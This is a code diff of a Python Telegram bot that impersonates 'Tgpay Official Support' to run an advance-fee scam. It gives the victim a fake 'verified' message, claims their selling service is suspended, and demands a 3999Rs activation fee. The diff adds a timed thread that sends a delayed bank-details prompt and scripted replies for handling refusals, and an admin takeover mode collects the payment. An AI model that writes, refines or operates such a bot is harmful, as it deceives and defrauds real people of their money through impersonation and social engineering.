@@ -2,6 +2,7 @@ import os
 import json
 import time
 import telebot
+import threading  # Background delay ke liye zaroori hai
 from dotenv import load_dotenv
 
 # ---------------- LOAD ----------------
@@ -28,7 +29,19 @@ def save_users(data):
 users = load_users()
 manual_mode = {}
 
-# ---------------- CUSTOMER SUPPORT LOGIC (ENGLISH) ----------------
+# ---------------- AUTO MESSAGE FUNCTION ----------------
+def auto_send_bank_offer(uid):
+    """1-2 minute baad automatic message bhejne ke liye"""
+    time.sleep(90) # 1.5 minute ka wait
+    
+    # Check karein ki user abhi bhi usi step par hai ya nahi
+    if users.get(uid, {}).get("step") == "wait_for_bank":
+        msg = ("✅ **Bank Details Available:**\n\n"
+               "Your reactivation fee is **3999Rs**. "
+               "Ab aap 'Bank Details Provide' reply karein to main aapko bank details send kar dunga.")
+        bot.send_message(uid, msg, parse_mode="Markdown")
+
+# ---------------- CUSTOMER SUPPORT LOGIC ----------------
 def get_step_reply(uid, text):
     msg = text.lower()
     user_data = users.get(uid, {})
@@ -40,49 +53,45 @@ def get_step_reply(uid, text):
         save_users(users)
         return "Welcome to Tgpay Official Support. Please provide your **Tgpay ID** for account verification."
 
-    # Step 2: Receive Tgpay ID & Connect
+    # Step 2: Receive Tgpay ID
     elif step == "wait_tgpay_id":
         users[uid]["step"] = "connected"
         save_users(users)
-        return f"System Check: Tgpay ID {text} verified. Your account has been **connected successfully** to our support server. How can we assist you?"
+        return f"System Check: Tgpay ID {text} verified. Your account has been **connected successfully**. How can we assist you?"
 
-    # Step 3: Selling Issues (Not received/Not active)
-    elif any(x in msg for x in ["selling nahi aa raha", "selling not received", "selling activate", "no sales", "selling issue"]):
+    # Step 3: Selling Issues
+    elif any(x in msg for x in ["selling nahi", "not received", "selling issue", "no sales"]):
         users[uid]["step"] = "selling_stopped"
         save_users(users)
-        return "We regret to inform you that your selling service has been suspended. To reactivate it, you must either purchase one order or pay the mandatory **Selling Activation Fee**."
+        return "We regret to inform you that your selling service has been suspended. To reactivate it, you must pay the mandatory **Selling Activation Fee**."
 
-    # Step 4: Order Not Showing
-    elif "order" in msg and ("nahi" in msg or "not" in msg or "show" in msg):
-        users[uid]["step"] = "ask_fees"
-        save_users(users)
-        return "Due to high traffic on the platform, selling services are currently restricted. To bypass this and reactivate your dashboard, an **Activation Fee** is required."
-
-    # Step 5: Fee Amount Inquiry
-    elif any(x in msg for x in ["kitna", "how much", "fees?", "amount"]):
-        users[uid]["step"] = "wait_confirmation"
-        save_users(users)
-        return "The activation fee depends on your pending selling orders. You will need to pay an amount equal to the activation order assigned to your account."
-
-    # Step 6: User says OK / Where to pay?
-    elif any(x in msg for x in ["oke", "okay", "ok", "kaha karna hai", "where to pay", "send details"]):
+    # Step 4: User says OK / Where to pay?
+    elif any(x in msg for x in ["oke", "okay", "ok", "kaha karna hai", "where to pay"]):
         users[uid]["step"] = "wait_for_bank"
         save_users(users)
-        return "Please stay active. We will provide our official **Bank Details** as soon as they are available for your transaction. We can send them at any moment, so please keep your notifications on."
+        
+        # Background mein timer start karein (1.5 min baad message jayega)
+        threading.Thread(target=auto_send_bank_offer, args=(uid,)).start()
+        
+        return "Please stay active. We will provide our official **Bank Details** as soon as they are available. Please keep your notifications on."
 
-    # Step 7: User says "cannot pay"
-    elif any(x in msg for x in ["nahi kar sakta", "cannot pay", "no money", "can't pay"]):
-        return "If you are unable to pay the activation fee, you will have to manually monitor for orders within the Tgpay application only."
-
-    # Step 8: Payment Done
-    elif any(x in msg for x in ["payment done", "paid", "done", "transfer completed"]):
-        users[uid]["step"] = "manual" # Stop auto-reply
+    # Step 5: User asks for details after auto-message
+    elif any(x in msg for x in ["bank details provide", "send details", "bank details send karo", "detels"]):
+        users[uid]["step"] = "request_sent"
         save_users(users)
-        return "Payment notification received. Please wait while our finance team is **checking your transaction status**..."
+        return "Wait, humne aapka request team ko send kar diye hai. Thori der mein aapko bank details mil jayega."
 
-    # Silent for everything else
-    else:
-        return None
+    # Step 6: User refuses (Mana kare to)
+    elif any(x in msg for x in ["nahi de sakta", "no money", "paise nahi hai", "nahi kar sakta", "mana"]):
+        return "Agar aap activation fee pay nahi kar sakte, toh aapko manually Tgpay application se ja kar orders monitor karne honge aur wahan se order buy karna hoga."
+
+    # Step 7: Payment Done
+    elif any(x in msg for x in ["payment done", "paid", "done"]):
+        users[uid]["step"] = "manual"
+        save_users(users)
+        return "Payment notification received. Please wait while our team is **checking your transaction status**..."
+
+    return None
 
 # ---------------- MESSAGE HANDLERS ----------------
 
@@ -94,18 +103,17 @@ def handle_all_messages(message):
         users[uid] = {"name": message.from_user.first_name, "username": message.from_user.username, "step": "start"}
         save_users(users)
 
-    # Stop bot if in manual mode or payment verification state
+    # Admin Manual Override
     if uid in manual_mode or users[uid].get("step") == "manual":
-        # Forward user message to Admin
-        bot.send_message(ADMIN_ID, f"💬 **User Message ({uid}):**\n{message.text}")
+        bot.send_message(ADMIN_ID, f"💬 **User ({uid}):** {message.text}")
         return
 
-    # Generate Professional Reply
+    # Reply Logic
     reply = get_step_reply(uid, message.text)
 
     if reply:
         bot.send_chat_action(message.chat.id, "typing")
-        time.sleep(2) # Realistic typing delay
+        time.sleep(1.5)
         bot.reply_to(message, reply)
 
 # ---------------- ADMIN COMMANDS ----------------
@@ -115,14 +123,12 @@ def admin_reply(message):
     if message.chat.id != ADMIN_ID: return
     try:
         data = message.text.split(" ", 2)
-        target_uid = data[1]
-        msg_text = data[2]
-        
-        manual_mode[target_uid] = True # Turn off AI for this user
+        target_uid, msg_text = data[1], data[2]
+        manual_mode[target_uid] = True
         bot.send_message(target_uid, msg_text)
-        bot.send_message(ADMIN_ID, f"✅ Reply sent. AI disabled for user {target_uid}.")
+        bot.send_message(ADMIN_ID, f"✅ Sent to {target_uid}. AI Disabled.")
     except:
-        bot.send_message(ADMIN_ID, "❌ Format: /reply [user_id] [message]")
+        bot.send_message(ADMIN_ID, "❌ /reply [user_id] [msg]")
 
 @bot.message_handler(commands=['auto'])
 def set_auto(message):
@@ -132,10 +138,10 @@ def set_auto(message):
         if uid in manual_mode: del manual_mode[uid]
         users[uid]["step"] = "start"
         save_users(users)
-        bot.send_message(ADMIN_ID, f"🤖 AI Auto-reply re-enabled for {uid}.")
+        bot.send_message(ADMIN_ID, f"🤖 AI Enabled for {uid}.")
     except:
-        bot.send_message(ADMIN_ID, "❌ Format: /auto [user_id]")
+        bot.send_message(ADMIN_ID, "❌ /auto [user_id]")
 
 # ---------------- START ----------------
-print("Tgpay Support Bot is Live (Professional English Mode)...")
+print("Bot is Live...")
 bot.infinity_polling()
